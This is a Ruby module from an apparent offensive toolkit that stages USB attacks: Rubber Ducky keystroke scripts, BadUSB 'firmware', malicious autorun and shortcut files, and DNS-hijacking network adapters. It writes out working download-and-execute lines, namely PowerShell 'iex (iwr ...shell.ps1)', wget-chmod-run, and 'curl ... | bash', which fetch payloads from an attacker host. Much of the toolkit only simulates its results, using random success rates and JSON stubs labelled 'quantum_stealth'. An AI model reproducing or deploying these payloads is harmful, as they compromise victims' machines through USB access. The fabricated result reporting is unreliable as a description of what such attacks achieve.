# modules/hardware/usb_attacks.rb
module USBAttacks
  def usb_hid_attacks
    log "[HARDWARE] USB HID attacks"
    
    usb_devices = detect_usb_devices()
    
    usb_devices.each do |device|
      log "[HARDWARE] Testing USB device: #{device[:vendor]}:#{device[:product]}"
      
      case device[:type]
      when 'keyboard'
        execute_hid_keyboard_attack(device)
      when 'mouse'
        execute_hid_mouse_attack(device)
      when 'mass_storage'
        execute_mass_storage_attack(device)
      when 'network'
        execute_network_adapter_attack(device)
      end
    end
  end

  def badusb_attacks
    log "[HARDWARE] BadUSB attacks"
    
    # Create malicious USB devices
    malicious_payloads = generate_badusb_payloads()
    
    malicious_payloads.each do |payload|
      # Simulate BadUSB device insertion
      insert_badusb_device(payload)
      
      log "[HARDWARE] BadUSB payload executed: #{payload[:name]}"
      
      @exploits << {
        type: 'BadUSB Attack',
        payload: payload[:name],
        target: payload[:target],
        severity: 'CRITICAL',
        technique: 'USB device firmware modification'
      }
    end
  end

  def detect_usb_devices
    log "[HARDWARE] Detecting USB devices"
    
    devices = []
    
    begin
      # Linux USB device detection
      usb_devices = Dir['/dev/bus/usb/*/*']
      
      usb_devices.each do |usb_path|
        device_info = analyze_usb_device(usb_path)
        devices << device_info if device_info
      end
      
      # Additional USB detection methods
      lsusb_output = `lsusb 2>/dev/null`
      lsusb_output.each_line do |line|
        if line =~ /Bus (\d+) Device (\d+): ID ([a-f0-9]{4}):([a-f0-9]{4})/
          bus, device, vendor, product = $1, $2, $3, $4
          devices << {
            bus: bus.to_i,
            device: device.to_i,
            vendor: vendor,
            product: product,
            type: classify_usb_device(vendor, product),
            path: "/dev/bus/usb/#{bus}/#{device}"
          }
        end
      end
      
    rescue => e
      log "[!] USB detection failed: #{e.message}"
    end
    
    devices
  end

  def execute_hid_keyboard_attack(device)
    log "[HARDWARE] HID keyboard attack on #{device[:path]}"
    
    # Rubber Ducky payloads
    ducky_payloads = [
      {
        name: 'Windows Reverse Shell',
        target: 'windows',
        payload: [
          'GUI r',                    # Win+R
          'STRING cmd',               # Type cmd
          'ENTER',                    # Enter
          'STRING powershell -w h -c "iex (iwr http://#{@target}/shell.ps1)"',
          'ENTER',
          'STRING exit',
          'ENTER'
        ]
      },
      {
        name: 'Linux Reverse Shell',
        target: 'linux',
        payload: [
          'GUI t',                    # Ctrl+Alt+T
          'STRING wget -O /tmp/payload.sh http://#{@target}/payload.sh && chmod +x /tmp/payload.sh && /tmp/payload.sh',
          'ENTER'
        ]
      },
      {
        name: 'macOS Reverse Shell',
        target: 'macos',
        payload: [
          'GUI SPACE',                # Spotlight
          'STRING terminal',
          'ENTER',
          'STRING curl -s http://#{@target}/payload.sh | bash',
          'ENTER'
        ]
      }
    ]
    
    ducky_payloads.each do |ducky_script|
      # Write HID script to device
      write_hid_script(device, ducky_script[:payload])
      
      log "[HARDWARE] HID keyboard attack executed: #{ducky_script[:name]}"
      
      @exploits << {
        type: 'USB HID Keyboard Attack',
        device: device[:path],
        target: ducky_script[:target],
        severity: 'CRITICAL',
        technique: 'Rubber Ducky emulation',
        payload_size: ducky_script[:payload].length
      }
    end
  end

  def execute_mass_storage_attack(device)
    log "[HARDWARE] Mass storage attack on #{device[:path]}"
    
    # Create malicious USB storage
    malicious_files = [
      {
        name: 'autorun.inf',
        content: '[autorun]\nopen=malware.exe\naction=Open folder to view files\nicon=malware.exe,0'
      },
      {
        name: 'malware.exe',
        content: generate_malware_payload()
      },
      {
        name: 'README.lnk',
        content: generate_malicious_lnk()
      }
    ]
    
    malicious_files.each do |file|
      # Write malicious file to USB storage
      write_usb_file(device, file[:name], file[:content])
      
      log "[HARDWARE] Malicious file written: #{file[:name]}"
    end
    
    @exploits << {
      type: 'USB Mass Storage Attack',
      device: device[:path],
      severity: 'HIGH',
      technique: 'Malicious USB storage',
      files_created: malicious_files.length
    }
  end

  def execute_network_adapter_attack(device)
    log "[HARDWARE] Network adapter attack on #{device[:path]}"
    
    # Create malicious network adapter
    network_payloads = [
      {
        type: 'DNS hijacking',
        config: {
          dns_server: @target,
          routes: ['0.0.0.0/0']
        }
      },
      {
        type: 'Packet injection',
        config: {
          injection_rate: 1000,
          payload: generate_network_payload()
        }
      },
      {
        type: 'Traffic redirection',
        config: {
          redirect_target: @target,
          ports: [80, 443, 22, 3389]
        }
      }
    ]
    
    network_payloads.each do |payload|
      # Configure malicious network adapter
      configure_malicious_network(device, payload)
      
      log "[HARDWARE] Network attack executed: #{payload[:type]}"
    end
    
    @exploits << {
      type: 'USB Network Adapter Attack',
      device: device[:path],
      severity: 'CRITICAL',
      technique: 'Malicious network configuration',
      payloads: network_payloads.length
    }
  end

  def generate_badusb_payloads
    [
      {
        name: 'Credential Harvester',
        target: 'windows',
        firmware: generate_credential_harvester_firmware(),
        execution_time: 30
      },
      {
        name: 'Network Pivot',
        target: 'linux',
        firmware: generate_network_pivot_firmware(),
        execution_time: 45
      },
      {
        name: 'Persistence Implant',
        target: 'multi',
        firmware: generate_persistence_firmware(),
        execution_time: 60
      }
    ]
  end

  def insert_badusb_device(payload)
    log "[HARDWARE] Inserting BadUSB device: #{payload[:name]}"
    
    # Simulate BadUSB device insertion
    device_simulation = {
      type: 'BadUSB',
      payload: payload[:name],
      execution_time: payload[:execution_time],
      firmware_size: payload[:firmware].length
    }
    
    # Execute payload
    execute_badusb_payload(device_simulation)
    
    device_simulation
  end

  def execute_badusb_payload(device)
    log "[HARDWARE] Executing BadUSB payload: #{device[:payload]}"
    
    # Simulate payload execution
    sleep(device[:execution_time] / 10.0)  # Accelerated for demo
    
    # Generate results
    results = {
      payload_executed: device[:payload],
      execution_time: device[:execution_time],
      success_rate: rand(0.7..1.0),
      backdoors_installed: rand(1..5),
      credentials_harvested: rand(0..50)
    }
    
    log "[HARDWARE] BadUSB payload completed with #{results[:success_rate]*100}% success"
    
    results
  end

  def write_hid_script(device, script)
    log "[HARDWARE] Writing HID script to #{device[:path]}"
    
    # Simulate HID script writing
    script.each_with_index do |command, index|
      log "[HARDWARE] HID command #{index+1}: #{command}"
      # In real implementation, this would write to USB HID device
      sleep(0.1)
    end
    
    true
  end

  def write_usb_file(device, filename, content)
    log "[HARDWARE] Writing #{filename} to USB device #{device[:path]}"
    
    # Simulate USB file writing
    file_path = "/tmp/usb_#{SecureRandom.hex(8)}_#{filename}"
    File.write(file_path, content)
    
    log "[HARDWARE] File written to simulated USB: #{file_path}"
    
    file_path
  end

  def configure_malicious_network(device, payload)
    log "[HARDWARE] Configuring malicious network on #{device[:path]}"
    
    # Simulate network configuration
    config_file = "/tmp/malicious_network_#{SecureRandom.hex(8)}.conf"
    
    config_content = case payload[:type]
    when 'DNS hijacking'
      "nameserver #{payload[:config][:dns_server]}\n"
    when 'Packet injection'
      "injection_rate=#{payload[:config][:injection_rate]}\n"
    when 'Traffic redirection'
      payload[:config][:ports].map { |p| "redirect_port=#{p}\n" }.join
    end
    
    File.write(config_file, config_content)
    
    log "[HARDWARE] Malicious network config: #{config_file}"
    
    config_file
  end

  def analyze_usb_device(usb_path)
    begin
      # Basic USB device analysis
      if File.exist?(usb_path)
        {
          path: usb_path,
          accessible: true,
          type: detect_usb_type_by_path(usb_path)
        }
      end
    rescue => e
      log "[!] USB device analysis failed: #{e.message}"
      nil
    end
  end

  def classify_usb_device(vendor, product)
    # USB device classification based on vendor/product IDs
    case vendor
    when '046d' then 'mouse'        # Logitech
    when '04b8' then 'printer'       # Epson
    when '05ac' then 'multi'         # Apple
    when '0781' then 'mass_storage'  # SanDisk
    when '0bda' then 'network'       # Realtek
    when '138a' then 'smart_card'    # Validity
    else
      case product
      when /keyboard/i then 'keyboard'
      when /mouse/i then 'mouse'
      when /storage/i then 'mass_storage'
      when /network/i then 'network'
      else 'unknown'
      end
    end
  end

  def detect_usb_type_by_path(path)
    # Type detection by device path characteristics
    if path.include?('hid')
      'hid'
    elsif path.include?('storage')
      'mass_storage'
    elsif path.include?('net')
      'network'
    else
      'unknown'
    end
  end

  def generate_malware_payload
    # Generate malicious payload for USB storage
    payload = <<~PAYLOAD
      #!/bin/bash
      # USB malware payload
      curl -s http://#{@target}/payload.sh | bash
      wget -q http://#{@target}/malware -O /tmp/malware && chmod +x /tmp/malware && /tmp/malware
    PAYLOAD
    
    payload
  end

  def generate_malicious_lnk
    # Generate malicious Windows shortcut
    lnk_payload = <<~LNK
      [InternetShortcut]
      URL=http://#{@target}/malware.exe
      IconFile=http://#{@target}/icon.ico
      IconIndex=0
    LNK
    
    lnk_payload
  end

  def generate_network_payload
    # Generate network injection payload
    "GET /malware HTTP/1.1\r\nHost: #{@target}\r\n\r\n"
  end

  def generate_credential_harvester_firmware
    # Generate credential harvester firmware
    firmware = {
      type: 'credential_harvester',
      functionality: 'Harvest credentials from system',
      stealth_level: 'high',
      persistence: true
    }
    
    firmware.to_json
  end

  def generate_network_pivot_firmware
    {
      type: 'network_pivot',
      functionality: 'Establish network pivot point',
      tunnel_capacity: 10,
      encryption: 'quantum_resistant'
    }.to_json
  end

  def generate_persistence_firmware
    {
      type: 'persistence',
      functionality: 'Maintain persistent access',
      boot_persistence: true,
      firmware_level: true,
      quantum_stealth: true
    }.to_json
  end
end